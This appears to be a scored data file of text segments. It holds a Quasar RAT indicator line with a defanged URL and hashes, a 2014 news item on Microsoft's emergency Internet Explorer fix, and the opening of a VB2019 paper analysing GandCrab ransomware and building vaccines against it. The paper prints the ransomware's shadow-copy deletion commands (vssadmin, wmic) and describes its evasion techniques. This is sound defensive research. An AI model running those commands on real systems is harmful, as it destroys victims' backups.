myswcd[.]com/vol/v2.exe,Quasar RAT
7EEF6EF8FED53B7C3BF61BA821F375A0A433EA4CB0185FD223780B729A9A5792
268909BC33F0F8C5312B51570016311E3676AF651A57DE38E42241DCC177B2D6
D9A967D0CAA8DB86FECA3AE469EF6797E81DFDAC4D8531658CB242A87C80CE05
",0.01017339552157448
"Microsoft rushes out Internet Explorer fix – even for XP machines
Microsoft rushed out an emergency security fix for Internet Explorer, to fix a flaw which hackers had already exploited - affecting IE versions 6 to 11 on several versions of Windows.",0.016066209953610522
2 May 2014 - 04:46PM,0.011153500317487963
"Microsoft rushed out an emergency security fix for Internet Explorer, to fix a flaw which hackers had already exploited – affecting IE versions 6 to 11 on several versions of Windows.",0.015682856836332415
"Microsoft rushed out an emergency security fix for Internet Explorer, to fix a flaw which hackers had already exploited – although the tech giant said the actual number of attacks using the bug, which affected IE versions 6 to 11 was “very small”. The big surprise for many, though, was that the patch also updated Windows XP – which officially “retired” on April 8.",0.01215022346750605
"Describing this as an “unexpected move”, Network World said that Microsoft had “long held” that the dozen-year-old operating system would receive no more security updates after April 8.",0.017415304374384988
The flaw received large amounts of media coverage as it was the first major bug to affect Windows XP – although ESET’s Stephen Cobb pointed out that the flaw – which could allow an attacker to assume complete control over a machine – affected Internet Explorer Versions 6 to 11 on all versions of Windows.,0.009167313461534099
"ESET’s Aryeh Goretsky said, “While it is somewhat unprecedented that Microsoft would release a patch for a product they no longer support, it is not surprising in this circumstance, given the severity of the CVE-2014-1776 vulnerability, the fact that it was being exploited in the wild and that it was detected just as Windows XP entered retirement helps to explain Microsoft’s reasoning.”",0.010000355079395118
"“Out of band patches from Microsoft are rare and only issued in the most severe circumstances. Given, that, I strongly recommend sysadmins test and apply the patch as soon as possible on the computers they manage.”",0.011340708300927704
"In a blog post, Microsoft wrote that the extensive negative coverage had been “tough” and said, “This means that when we saw the first reports about this vulnerability we said fix it, fix it fast, and fix it for all our customers. So we did. The update that does this goes live today at 10 a.m. PDT.”",0.013967996282972961
"“If you are like most people, you have automatic updates turned on, and you’ll get this new update without having to do anything. If you haven’t turned on automatic updates yet, you should do so now. Click the “Check for Updates” button on the Windows Update portion of your Control Panel to get this going.”",0.018290678663676063
"Microsoft pointed out that there had been a “very small” number of attacks based on the bug, and that concerns about it were “overblown.”",0.010775932726951876
"Regarding the unexpected Internet Explore fix for XP machines, the tech giant hinted that this was a one-off, saying, “ We made this exception based on the proximity to the end of support for Windows XP.  “",0.01503673953503104
"Trusted Reviews pointed out that in terms of sheer numbers, patching XP machines still made sense. The site wrote, “Perhaps most staggering of all is that XP still makes up 26 per cent of installed operating systems. Windows 8.1, in contrast, has just 5 per cent market share. That, is perhaps one of the other reasons that Microsoft has decided to apply the Internet Explorer fix to the older operating system.",0.012410792471511778
"The flaw was considered serious enough that the U.S. Department of Homeland Security issued warnings regarding it. Regarding the patch, the U.S. Computer Emergency Response Team (US-CERT) wrote, “Microsoft has released out-of-band updates to address a critical use-after-free vulnerability in Internet Explorer versions 6 through 11, including IE versions running on Windows XP. US-CERT recommends that users and administrators review Microsoft Security Bulletin MS14-021 and apply the necessary updates as soon as possible.”
",0.01612996701359448
VB2019 paper: Different ways to cook a crab: GandCrab ransomware-as-a-service (RaaS) analysed in depth,0.012031361562996001
Alexandre Mundo Alguacil & John Fokker,0.00949842842984261
"McAfee, Spain & The Netherlands",0.008809203503071794
"Table of contents
Abstract Introduction Version overview Version 1 Version 2 Version 3 Version 4 Version 5 Technical malware analysis Algorithms and languages Victim information and hard-coded values Payload execution Changes in GandCrab Version 5 Building a vaccine Ransomware-as-a-service (RaaS) analysis Partnerships to ensure growth Linking the ransomware to affiliates ID and SUB_ID characteristics observed Parent-child relationship ID increments Determining top IDs/affiliates SUB_ID role Overview versions and ID numbers Top affiliates missing in 5.2 Combining the sample timeline with a timeline of forum postings Colour coding and affiliate research Continued analysis The end of GandCrab Conclusion References",0.017857620477707448
Abstract,0.009485057568311417
"This paper examines the GandCrab ransomware, the biggest Ransomware-as-a-Service (RaaS) threat seen in 2018 and the first half of 2019. Through technical analysis, we discovered several mistakes and indicators in the malware. Armed with these findings, we were able to exploit those mistakes and build a publicly available vaccine against GandCrab.",0.01611992468366985
"The hard-coded indicators gave us a method to link individual ransomware samples to affiliates and, by looking at hundreds of GandCrab samples at once, we gained even more interesting insights into the service model dynamics. Subsequently, to learn more about the actor behind GandCrab and its affiliates, we carried out extensive underground forum research. This multi-angled approach gave us different ways to cook a GandCrab.",0.018074753199421423
"Our research was fuelled by a sense that, as an industry, we must realize that we cannot stop cybercrime alone and that we should aim to do more than just malware analysis and the writing of detection rules, especially when it comes to fighting RaaS-type threats. Unfortunately, we find ourselves in a situation where most of the cybercriminals involved in ransomware can operate with a certain degree of impunity – ransomware developers are often in countries that make legal prosecution difficult, and affiliates are hard to catch and can easily move from one RaaS to another, continuing their extortion operations.",0.015750021871319464
"While law enforcement faces a daunting challenge to bring the individuals responsible to justice, our industry’s knowledge, data and tooling should help with this task.",0.018692793076835357
Introduction,0.012036720276026314
"The GandCrab malware made its first appearance at the end of January 2018 and it didn’t take long for it to be discovered by the security community [1]. At that time, no one imagined that GandCrab would eventually grow to become the most prolific Ransomware-as-a-Service threat of 2018 and the first half of 2019. Its growth continued almost right up until it ceased to operate in mid-2019.",0.01523608291143197
"Looking back, we believe that its success was due to a combination of factors, from technical to partnering, marketing and servicing skills. GandCrab had a large underground forum presence and enjoyed attention from both fellow cybercriminals and security researchers. The GandCrab crew operated predominantly on one of the largest underground forums, where it acted with a sense of impunity, openly mocked the security industry, and boasted about its income.",0.015731122762270955
"Its growth and open communication style sparked our research, with GandCrab giving us a great opportunity to link our malware analysis (capability) with the adversary’s activity (GandCrab and its affiliates) on the underground forums.",0.01600134525127017
We used the Diamond Threat Model [2] as our guideline to structure our research.,0.018024789904446337
"We started out by closely examining the GandCrab ransomware code and all its versions. We looked for mistakes and to see if it contained any clues or special indicators. That was the basis for building the various vaccines. From an adversary point of view, we closely monitored GandCrab’s activity on the underground forums and investigated other forum users who showed an interest in the ransomware.",0.013413101699823349
Figure 1: Diamond Threat Model: link between the adversary and its capability.,0.022005950807158392
"Furthermore, we worked on gathering victim information via telemetry detections from the McAfee backend. Even though we had developed a vaccine that prevented encryption, customers could still be exposed to the virus executable and this telemetry allowed us to monitor hits based on hash values. By doing so, we linked potential victims not only to the specific malware but also, as discussed in our research, we were also able to link groups of GandCrab samples to a single adversary or, in this case, an affiliate.",0.016226112598740627
Figure 2: Linking victims to an adversary via the malware (capability).,0.016670860805852894
"This paper presents the highlights of our extensive research and details our methodology in examining the service model and the top GandCrab affiliates. Before we start with the technical analysis, it is important to understand the different versions of the ransomware that have been released.",0.01455999122052598
Version overview,0.007671484527368211
"In order to be able to identify possible mistakes in the malware, and/or to find ways to disrupt the service model, it was important for us to have a clear understanding of the different versions of the malware, its development speed, and the agility of the actors behind it.",0.012408631827444672
Version 1,0.007936925202762457
"The GandCrab malware was first discovered in late January 2018 by David Montenegro [1]. At the beginning, GandCrab only accepted payment of the ransom using Dash, but later included BTC as another method of payment. GandCrab was not made flawless; the first version and its infrastructure contained several mistakes that resulted in the development of a free decryptor.",0.014022048565372036
Version 2,0.007843350318393894
"On 5 March 2018, one week after the release of the decryptor, a new version of GandCrab was discovered by the research collective MalwareHunterTeam [3]. GandCrab had fixed earlier mistakes, rendering the previously developed decryptor useless. This version had a new extension for the crypted files, different hard-coded domains, and was offered in both .EXE and DLL formats, allowing affiliates to choose their preferred method of spreading the ransomware [4].",0.015173589793818332
The GandCrab crew’s swift response to the release of the decryptor showed that they were agile and determined to remain active.,0.018167484586436577
"There was already a hard-coded version number in the GandCrab malware, but this was not always accurate. We came across numerous strange version numbers that we believe were an attempt to mislead the research community.",0.012146054124867911
Version 3,0.007729180766692156
The third version of GandCrab was spotted around 23 April 2018 by a researcher using the Twitter handle nao_sec [5]. A later iteration of version 3 was subsequently discovered on 9 May 2018 by a researcher with the Twitter handle zswei [6].,0.01180336341210464
"Version 3 was the first to have a different wallpaper and we discovered signs of sub-versions of this iteration, identified by subtle changes in the wallpaper and, in some cases, the use of process injection.",0.009021449680440274
Version 4,0.00769406088285407
"At the beginning of July 2018, version 4 was released. Version 4 featured some significant changes from the earlier versions. An important difference in version 4.0 was a change in the algorithm used to encrypt files. Earlier versions used RSA and AES; in version 4 GandCrab switched to Salsa20. We believe that this was mostly done for speed. RSA is a powerful but slow algorithm, whereas Salsa20 can encrypt much faster and the implementation is smaller. The ransomware generates a pair of RSA keys before encrypting any file. The public key encrypts the Salsa20 key and the random initialization vector (IV, or nonce) generated later for each file. GandCrab also used the registry to keep the generated RSA keys; this later proved vital in making the different vaccines.",0.01806737799343483
"To further increase speed, GandCrab started using another thread to look for network shares besides the normal encryption thread. The wallpaper introduced in version 3 disappeared.",0.01417118201810108
"One of the most important changes that helped our research was the introduction of more stable administration using hard-coded ID and SUB_ID numbers in the ransomware. We believe the GandCrab developers introduced this in order to have a tight accounting method for all the affiliate infections, to cope with the growth of the RaaS. Eventually, these hard-coded values proved to be vital in our research to understand the service model through large-scale ID number tracking and linking ID numbers to victims and affiliates.",0.014723453247908025
Version 5,0.007496186077614042
"In version 5, GandCrab showed real signs of stepping up its game by showcasing new alliances with other criminal services to strengthen its supply and distribution networks. One of these alliances became obvious during version 4, in which the ransomware started being distributed through the new Fallout exploit kit. In the announcement of version 5, the GandCrab crew openly endorsed working with the Fallout exploit kit.",0.01506890329845878
"This was not the only partnership, though: another alliance was formed with a malware crypter service called NTCrypt and, later, AlexCrypt. A crypter service provides malware obfuscation to evade detection by anti-malware products. However, the GandCrab crew were not completely ruthless – after receiving a Tweet from a Syrian victim they decided to unlock all victims in that locale.",0.01369952527086793
"On 25 October a decryptor for GandCrab up to version 5.03 was made available via the NoMoreRansom [7] platform. This was a huge blow for the almost untouchable GandCrab ransomware and gave rise to some interesting conversations in the cybercriminal underground. Interestingly, it was the user behind the Kraken ransomware, ThisWasKraken, who broke the news first on the forum. Shortly after the release of the decryptor, GandCrab came out with version 5.04. Based on the compilation dates of the first 5.04 samples we believe that this new version was not a direct reaction to the release of the decryptor, but a new version that they had already been planning on spreading. At the end of 2018 the activity slowed down. Judging by GandCrab’s underground posts (an example of which is shown in Figure 3), the cybercriminal group was working mostly in the background, trying to fix and improve the ransomware.",0.015800169783651064
Figure 3: GandCrab explaining the delays.,0.016162218147188212
"GandCrab came back with the release of version 5.1 on 16 January 2019, two days after the Orthodox new year [8]. However, this victory was short-lived because another decryptor was released at the end of January. In response, the criminals behind GandCrab released version 5.2 a couple of days after the publication of the new decryptor. Despite the new version, Europol announced in mid-March [9] that, with the new decryptor, more than 14,000 people had been able to save their encrypted files – a significant blow for the criminals. GandCrab announced that it was stopping its business on 31 May 2019, claiming it had made hundreds of millions of dollars along the way. Despite the amount of money made, no mercy was shown to the remaining victims and they were urged to pay the ransom – GandCrab did not release the last keys for free. Luckily for those victims, there came a final version of the GandCrab decryptor, meaning they could also get their files back without paying the ransom.",0.019054560297702916
Technical malware analysis,0.008584323905319824
"As discussed, several versions of GandCrab have been released since its initial appearance in January 2018. In this part we will highlight some technical insights into the two major versions: 4 and 5. Although some behaviours were the same, some significant changes were also observed.",0.011261553152419168
Algorithms and languages,0.008931934053136081
Versions 4 and 5 encrypted victim files using the Salsa20 algorithm. Previous versions of GandCrab had used AES as an encryption algorithm. The Salsa20 algorithm has some advantages over AES:,0.01587340125557324
Small code and very fast. Speed in relation to encrypting files is critical for ransomware. A faster algorithm is better than a slower one. AES uses the CPU extension behind the scenes.,0.015799144264436626
"Open-source implementation. AES also has open-source implementation, but the Salsa20 implementation is smaller in code and there are a lot of variants of the algorithm in source code format in C and other languages.",0.015849333033156277
Robust and with no known failures in the algorithm.,0.015638598442585194
Support for 16- and 32-bit keys with an initialization vector. GandCrab used the 32-bit version.,0.014160756788367257
"GandCrab obtained all processes of the system and searched for the common process names, just like other ransomware families such as Cerber. If it detected any of them, it would try to open the process and terminate it using the ‘TerminateProcess’ function.",0.014868825025540433
GandCrab checked the language of the victim system before starting the process of gathering information. For this it used the ‘GetUserDefaultUILanguage’ and ‘GetSystemDefaultUILanguage’ functions. These functions would get the local language of the victim system and compare it with a hard-coded list that included all CIS countries. If the victim system was based in one of the CIS countries GandCrab would terminate.,0.012034028919007067
"In the earlier versions of GandCrab there was no function for detection of the Syrian language. Later, after disclosing the decryption keys to victims in that locale, the GandCrab crew added the Syrian language to the hard-coded list.",0.01428164769221596
GandCrab determined the language of the victim machine by reading from a registry entry:,0.007744739539573331
[HKEY_CURRENT_USER\Keyboard Layout\Preload],0.011148983413782787
"It read the value and compared it against the hard-coded language list, checking for the Russian language value (0x419), for example.",0.009884323934195027
Figure 4: Language check on the victim’s system.,0.011595002439309665
"After the language check, GandCrab prepared a string based on the serial number of the main installation of Windows and some calculation (as a division by 2) in hexadecimal format. To this string the malware added the extension ‘.lock’ and checked for this file. If it already existed, the malware quit. If not, it continued.",0.011583629322672317
"Following the release by AhnLab of a program [10] that made this file act as a vaccine, the GandCrab crew responded by changing this check – a sign that they were closely monitoring the industry.",0.012444571333079857
"After that, the malware prepared the RSA public key, which was embedded and crypted with two layers (except in the last version of the malware (5.2), which used three layers to protect it). The first layer was a simple XOR operation with the value 0x5 and the second layer was decryption using the Salsa20 algorithm with a hard-coded key (see Figure 5). In v5.2 the third layer was a custom algorithm (the first layer, followed by the two other steps):",0.024152753952792816
Version 4 to 5.1: XOR + Salsa20,0.00867216190739184
Version 5.2: custom algorithm + XOR + Salsa20,0.008843298665214605
Figure 5: Decrypting the master RSA key in the second layer.,0.020362345019540706
The key of the Salsa20 algorithm is ‘[email protected] Dannd [email protected]’ (without quotes). It is based on the name of the author of the Salsa20 algorithm and his Twitter nickname (‘hashbreaker’).,0.015408347850230042
If the malware could not get the RSA key it would terminate since it was needed later. The RSA key was saved in a global var in a buffer to keep it in blob format.,0.01070368705620739
Victim information and hard-coded values,0.006505118227255635
"After preparing the RSA key, the ransomware would get information from the victim machine and save it as a big string that would later be ciphered with the RC4 (sometimes a custom XOR) algorithm and encoded in Base64 to save it into the ransom note.",0.017178132668469237
The information and fields were as follows:,0.00822782503313435
pc_user,0.00827174469895342
Name of the user logged into the machine.,0.012207893513002777
pc_name,0.008308228769443149
Name of the endpoint infected.,0.012000312032613092
pc_group,0.00901752134436029
Name of the domain or workgroup of the endpoint.,0.01239800213599307
AV,0.010821833916606738
Name or names of anti-virus product(s) in the endpoint.,0.009967404098982113
pc_lang,0.008139427991004977
Name of the language or languages of the endpoint.,0.011808562800838307
pc_keyb,0.009060686948584973
The type of keyboard on the endpoint.,0.009918573874476921
os_major,0.008371921221526635
The name of the operating system of the endpoint.,0.010084240313888548
os_bit,0.008176057242492263
The type of CPU of the infected endpoint.,0.009563362946830134
ransom_id,0.01063510918941546
Unique value for the victim for the ransom note and Onion web page to pay.,0.015227905612296144
hdd,0.008492529649665737
Information about the logic units.,0.014462325284498423
ip,0.008593221981890053
The IP address of the endpoint.,0.011292456559185982
"After preparing this big string, it would concat more special fields hard coded in the malware sample. These values were:",0.011743467285945886
id,0.008681784350801358
The affiliate id number.,0.014217153361219093
sub_id,0.007746889386398892
The sub id of the affiliate id.,0.013092960770869966
version,0.007521863529198702
"The internal version number of the malware. In the example below, it is ‘4.0’ but the last version would have shown ‘5.2’.",0.009750883630728735
The malware concated these fields with the previously mentioned big string to finally get all the information about the system and malware information in plain text.,0.01236203981111772
The hard-coded values above proved to be of great importance in analysing the RaaS model of GandCrab.,0.011583297887119648
"For example, in this case the final string is as follows (some fields are altered to fool the malware to fill the fields):",0.01041934819192647
"pc_user=IDC_UNIT56&pc_name=IDC_SEAT_56&pc_group=WORKGROUP&av=[System Process],
smss.exe&pc_keyb=0&os_major=MicrosoftWindowsXP&os_bit=x86&ransom_id=6deb15d
d9c2e5c79&hdd=C:FIXED_10725732352/8747036672,E:REMOTE_511503020032/2577879613
44&id=15&sub_id=15&version=4.0",0.011688550275316567
This big string would be crypted and a Base64 string prepared from it to put in the ransom note between the marks:,0.010991675815603008
---BEGIN PC DATA---,0.019098427844102095
---END PC DATA---,0.02202329285994231
Payload execution,0.006980818228480179
After these steps the malware started its critical malicious payload that was executed in a number of steps.,0.014823443483830578
The first step was to verify the file extensions that the malware was not allowed to encrypt. These were stored in a hard-coded buffer crypted with the value 0x5.,0.009363028820324137
The extensions that were blacklisted were as follows:,0.009627776033907298
.ani,0.010658829671148506
.cab,0.00777311092567623
.cpl,0.007618468351550334
.cur,0.00920710507269884
.diagcab,0.007810513804330288
.diagpkg,0.008169578266781774
.dll,0.007316750198437694
.drv,0.007259032611733995
.lock,0.00852692054531723
.hlp,0.007892504597936778
.ldf,0.008301742327773587
.icl,0.007906883789643326
.icns,0.00781591714168517
.ico,0.00803382877143266
.ics,0.008670873085471209
.lnk,0.008058813235014117
.key,0.008430853207808231
.idx,0.009709312967702943
.mod,0.008196452295334278
.mpa,0.008416324495189254
.msc,0.007816112508484019
.msp,0.008207009066812154
.msstyles,0.008982369707467353
.msu,0.008132280611535703
.nomedia,0.00965751509760604
.ocx,0.007488532757708222
.prf,0.007491355123173338
.rom,0.008710370442225113
.rtp,0.00774294323078184
.scr,0.008294805481884437
.shs,0.008189548259784019
.spl,0.008805436076851136
.sys,0.007166025353793959
.theme,0.008545259140041561
.themepack,0.009455629228049767
.exe,0.0082505854464483
.bat,0.008170005706571337
.cmd,0.007835763417901265
.gandcrab,0.008927243981431965
.KRAB,0.007779319338877211
.CRAB,0.007923253273929398
.zerophage_i_like_your_pictures,0.010563651784576189
"The above list is an example of common extensions to avoid, just as other ransomware families use. However, GandCrab’s list includes some additions that are interesting:",0.015765746653427892
".lock: this extension belongs to the files that the malware creates in each folder to indicate that it is crypting them, as a measure to avoid another instance of GandCrab affecting the same folder. Usually this file is empty; for GandCrab only its presence/absence is important.
This file extension changed in some samples to ‘.luck’ or ‘.fuck’, so not all versions have the same name.",0.011991687836233167
".zerophage_i_like_your_pictures: this extension does not exist by default in
Windows
; it is a joke against a malware analyst, zerophage.",0.009942024904569857
.KRAB: this extension is included to avoid crypting the files that had already been encrypted.,0.012217316888306962
".CRAB: again, this extension is included to avoid crypting the files that had already been encrypted.",0.012185932507773778
"The newest versions of GandCrab did not use a special extension, instead calculating a random extension that could be from 5 to 10 characters in length, depending on the version. In this case GandCrab saved the randomly created extension in the registry too, in a special subfolder (with the exception of the last version where this registry write code was removed to destroy the vaccine that had been created). In any event, the extension was included in the ransom note so the official decryptor (given to the victims when they paid the ransom) had the correct extension to search for.",0.01635803709112682
The next action of the malware was to create a pair of RSA keys (one public and one private) to protect the keys that would later be used to crypt the files.,0.013640512942654559
The malware reserved two memory buffers with ‘VirtualAlloc’ and acquired the context of the cryptosystem of Windows using the ‘CryptAcquireContextW’ function with the parameter ‘Microsoft Enhanced Cryptographic Provider 1.0’.,0.0160774298510592
"In v1 of GandCrab there was a bug at this point where keys could be extracted from memory. After the release of a decryptor, the actors resolved this in version 2 using the value 0xF0000000 as a flag.",0.00920706649992542
"After creating the key pair, GandCrab exported them in two RSA blobs using the ‘CryptExportKey’ function with the argument ‘6’ for the public RSA1 key blob and with the argument ‘7’ for the private RSA2 key blob. After the exports, it destroyed the key pair from memory using the ‘CryptDestroyKey’ function and released the context using the ‘CryptReleaseContext’ function. In this case the function returned with TRUE as a result to cause the malware to follow the normal flow to crypt shares and files later.",0.01243749095736224
"It is important to understand that the memory reserved for both blobs was not released at this point as it would be needed later. By taking a memory dump at this point, both blobs could be retrieved.",0.01141352177579924
"Before version 4.0, GandCrab was creating registry settings that we could use to create a vaccine. If these registry settings were already present, and the ransomware failed to create them, the malware would not encrypt and would terminate. However, this was adjusted in version 5.2.",0.011832779474803767
"Another protection mechanism that worked with v4.0 and some of v5 (not including 5.2) was to create subkeys in the registry and remove all rights for all users (including SYSTEM). This way the subkey could not open because of the ERROR_ACCESS_DENIED (5) error that not is checked. The malware would create the Salsa20 key, etc. anyway, but could not save them in the registry and would return FALSE, causing the code flow to delete itself without crypting anything in the endpoint.",0.011925567717397612
"The next action by the malware was to prepare the strings of information about the infected endpoint (that was crypted in the previous layer) and the Salsa20 key, IV and RSA2 private key blob (all crypted in the first layer).",0.01659048389575213
"For this, the malware prepared some strings that were hard coded in the code:",0.00745614621563051
--- BEGIN GANDCRAB KEY ---,0.015617319535656371
--- END GANDCRAB KEY ---,0.018553786265177785
"Between these two strings the malware kept in memory the Salsa20, IV and crypted RSA2 buffer but, before that, it crypted the RSA2 buffer again with another layer.",0.015149473933942614
"The next action was to prepare the ransom note in memory. The malware decrypted the ransom note text with a XOR value of 0x10. After decrypting the full ransom note, it once again got the system information for the ‘random_id’ and ‘pc_group’ fields. Next, it wrote the previous string with the information of the endpoint and malware sample crypted between the two marks ‘ --- BEGIN PC DATA --- ’ and ‘ --- END PC DATA --- ’ and the Salsa20 key, IV and RSA2 private key blob crypted between the two marks ‘--- BEGIN GANDCRAB KEY --- ’ and ‘ --- END GANDCRAB KEY --- ’.",0.01719137980728591
"When the note had been created, the malware prepared to start encrypting files. It would get all logic units that were of the type FIXED or REMOTE. For each one discovered, it would create a thread that would encrypt that particular unit.",0.010829991745934575
In this procedure the malware would check if the path was blacklisted. The list of blacklisted paths was as follows:,0.011831118699252574
\ProgramData\,0.00866412995328203
\IETldCache\,0.011909277661198092
\Boot\,0.009059975744967086
\Program Files\,0.008658044182906499
\Tor Browser\,0.00926019684290913
\All Users\,0.009346701782787292
\Local Settings\,0.008893368007428903
\Windows\,0.009233978870149762
"These strings were hard coded in the binary in the read data section. Later, the malware checked more paths using the ‘SHGetSpecialFolderPathW’ function for these paths:",0.011418827084723637
CSIDL_PROGRAM_FILESX86,0.009942896662661571
CSIDL_PROGRAM_FILES_COMMON,0.010342349993468614
CSIDL_WINDOWS,0.008666910061255528
CSIDL_LOCAL_APPDATA,0.010379859917802658
"If the path was one of the blacklisted ones, the thread would finish without encrypting anything. If a valid path was discovered, it would write the ransom note in this path with the name ‘KRAB‑DECRYPT.TXT’.",0.01494518060812633
"For each file discovered, it would check the name to avoid the actual directory (name: ‘.’) and the previous directory if it existed (name: ‘..’) and check the flags of the file to see if a directory existed with a TEST operation with the value 0x10. Finally, after encryption took place, the ransomware changed the name of the file, adding the extension ‘.KRAB’.",0.013501679489898555
It is important to reiterate that the last version of the malware (v5.2) did not use the ‘.KRAB’ extension but instead used a random extension with 5 to 10 random characters.,0.010528412334892212
Figure 6: Renaming of file to new extension.,0.013725605222081771
"Once all encrypting had taken place it would start to delete the Volume Shadow Copies to prevent restoration of files. If the operating system version was older than Windows Vista, it would prepare a hard-coded string in the code to delete the shadow volumes in a quiet way:",0.011796578617547016
cmd.exe /c vssadmin delete shadows /all /quiet,0.008777187990974489
"If the OS version was Windows Vista or above, it would prepare the hard-coded text in the code:",0.010246771237455765
\wbem\wmic.exe shadowcopy delete,0.008214702153023223
"Finally, the malware deleted itself without warning the user or awaiting user interaction.",0.012507774507639513
Changes in GandCrab Version 5,0.008690722179173327
"Version 5 of GandCrab included a lot of changes to make analysis more complex. The authors also fixed a lot of code in the last version, ‘5.2’, to avoid problems and vaccines, but that did not stop us from creating working vaccines for all versions.",0.01331735172328452
"One important change in the 5.x version was the inclusion of exploits to elevate privileges. The exploits were CVE-2018-8440 [11] by SandboxEscaper [12], and CVE-2018-8120 [13, 14].",0.0077040762624487336
"The first version of GandCrab v5 was faulty because it used one exploit directly with IAT calls that do not exist in Windows XP. This prevented it from working on that OS, but the issue was quickly fixed in the next version.",0.009662295235846718
"Both exploits were used in Windows 7 and newer OS versions to try to get SYSTEM privileges. With CVE-2018-8120 [15], it tried to steal the system token of the SYSTEM idle process. In the other exploit, the malware tried to load a special DLL that had crypted code inside, one for 32-bit and another for 64-bit systems.",0.01004269051086737
These exploits could be blocked if a mutex with a hard-coded name exists in the future infected machine (see Figure 7).,0.013911514472152553
"Figure 7: Check of the mutex – if it already exists, the exploits are blocked.",0.01171809471584817
Some changes in the v5.2 family included:,0.008288718356948888
"Instead of using a hard-coded extension after encryption, it created a name with 5 to 10 random characters.",0.01197346032502189
The use of two exploits.,0.011471449051758342
Changing the desktop wallpaper on the infected system to a bitmap generated in runtime with the name of the active user and the extension used for the encrypted files. This wallpaper was created in a faulty way if the vaccine (explained later) was used – in that case the extension did not appear.,0.009824879223202077
The wallpaper was saved on the hard disk in the %TEMP% folder with the hard-coded name ‘pidor.bmp’ (a very rude word in the Russian language).,0.010809814609964108
"The username was checked with ‘SYSTEM.’ If the user was ‘SYSTEM’, the malware put the name ‘USER’ in the wallpaper. This check was made to avoid changing the wallpaper on an account where GandCrab had achieved system privileges, presumably because that would have alerted the user to what had happened.",0.009178517807444941
The last version of GandCrab also removed a lot of useless code that been inserted to try to obfuscate some macros and static disassembling.,0.013539698390224175
"Besides all the layers that GandCrab put in the last version (5.2), an unofficial version ‘5.3’ was uploaded to VirusTotal with a different ransom note and another RSA public key. We do not know for sure why this happened.",0.01313083534102244
Building a vaccine,0.010793237738782602
"During its development history, GandCrab showed clear differences in programming styles and mistakes made, which supports our hypothesis that multiple programmers worked on the code.",0.01631785388410123
One of our goals with this ransomware threat was to create a vaccine that could work against it and protect our customers’ systems.,0.015024635589701019
Our approach was to reverse the inner workings of the GandCrab family in order to discover failures in the design of the malware so that could create effective vaccines.,0.016613661346280506
"In total, six vaccines were crafted. The first was the most interesting because it was clear that a flaw existed in the logic of the malware. The GandCrab crew did not fix this until version 5.",0.011419470599121295
"The vaccine was based on code stored in the registry [16, 17]. The information, without Base64, was the same as that which appeared in the ransom note in the key part (but in the ransom note it was encoded in Base64 to print all characters). One registry subkey was stored in HKLM or HKCU, based on the privileges of the user that ran the malware. It used the public RSA key generated in runtime to protect the private RSA key of the victim.",0.014086709544886111
"The flaw in the design was that it didn’t use these registry values in later versions, even in the official decryptor. The malware checked for the existence of this subkey and values. If it found the public RSA key called ‘public’ it did not check the content to see if it was correct. If the value in the subkey was empty, or contained some random content, the malware believed that the victim machine was already infected and skipped all processes to encrypt files. In this case the malware launched the network thread anyway, if the victim had Internet connectivity, but the critical and most dangerous part was never launched. For the wallpaper change, a bitmap file was created in runtime and stored with the hard-coded name ‘pidor.bmp’ in the %TEMP% folder of the infected system. Another vaccine that we made cleaned this file and removed the wallpaper, exchanging it for a clean wallpaper [18].",0.009304785728917242
"This vaccine worked for at least six months after its release to the public. It took until early this year, and the release of version 5 of GandCrab, for this part of the code to be cleaned and the vaccine thus rendered useless.",0.012323606900270456
"Another vaccine [19] came about from a clear design flaw, and an indication that the GandCrab crew did not care about the coding: in version 5 a hidden window was created with a hard-coded class name. When it was reversed and analysed, it only took us five minutes to make a new vaccine in a program that searched the full system, on an x-period basis, for the window with this class name (see Figure 8).",0.013378447868124699
Figure 8: Searching for GandCrab window.,0.013824272036614849
"This was because the chosen class name was not present in Windows, thus action could be taken against it without any risk of harm to the operating system.",0.013597659209071078
"When the program detected the window, it would get the PID of the process linked to that window and, with the PID, it was able to close and terminate it. This meant that, with this vaccine, it was impossible for GandCrab to run – when it created and ‘showed’ the window, the vaccine would discover it and terminate it.",0.013138910872419807
"This vaccine was fixed more quickly than others, in the cleaning up of code that GandCrab undertook, making the vaccine useless.",0.015269376471920504
"Other vaccines [20] included a search for a mutex name and creation of it in the system before infection even occurred; the flaw here was that the mutex name was always the same, regardless of what machine was affected. Even if it had been variable, it was very easy to mimic the same behaviour and create a successful vaccine (the last vaccine that worked with version 5.2 protected the system in this way). The GandCrab gang knew this, and sometimes changed the mutex name, but the vaccine was able to create the last two mutex names, meaning the last and previous versions were covered.",0.016538457646953497
"Prior to this vaccine, the GandCrab crew made another mistake that allowed us to create a new vaccine in a matter of minutes. They made a global atom in the machine, so our vaccine only needed to make the atom beforehand to protect the system. That was fixed when the mistake was discovered.",0.01269921243825256
"Figure 9 gives an overview of the timeline of the different GandCrab versions, our vaccines and the public decryptors.",0.01875971334163473
Figure 9: Version and vaccine timeline.,0.017419754412127952
Ransomware-as-a-service (RaaS) analysis,0.02312484511776125
"For malware to be successful, it needs to be effective, but it does not have to be flawless. As we have discussed, the various versions of GandCrab were full of little mistakes and errors that allowed us to build several different vaccines.",0.012940407294149026
"Thus, an important part of GandCrab’s success was its service model and marketing.",0.014457853055906855
"GandCrab is a prime example of a Ransomware-as-a-Service threat. RaaS follows a structure where the developers offer their product to individuals, affiliates or partners, who are responsible for spreading the ransomware and generating infections. The developers take a percentage of the earned income and the rest goes to the affiliates.",0.019355006232667504
Figure 10: High-level overview of the GandCrab RaaS model.,0.020705527089850295
Operating a RaaS model can be lucrative for both parties involved:,0.010914650821923777
"Developer’s perspective
The malware author(s) request a percentage per payment for use of their ransomware product. This way the developers have less risk than the affiliates spreading the malware. The developers can set certain targets for their affiliates regarding the number of infections they need to produce. In a way, this is very similar to a modern sales organization in the corporate world.
Subsequently, a RaaS model offers malware authors a safe haven when they operate from a country that does not regard developing malware as a crime. If their own nation’s citizens are not victimized, the developers will not be prosecuted.",0.013824289560432801
"Affiliate’s perspective
As an affiliate you do not have to write the ransomware code yourself; less technical skill is involved. RaaS makes ransomware more accessible to a greater number of users. An affiliate just needs to be accepted in the criminal network and reach the targets set by the developers. As a service model it also offers a level of decentralization, where each party sticks to their own area of expertise.
If proper administration of infections per affiliate is kept, a RaaS business model (developer/affiliates percentages) ensures that everyone gets a piece of the proverbial ‘pie’.",0.015542928535941969
Partnerships to ensure growth,0.009544103155242123
During its lifetime we observed several essential partnerships being established between the GandCrab ransomware and other facilitating services. The fact that cybercriminals were working together was not a new thing.,0.014589452908022826
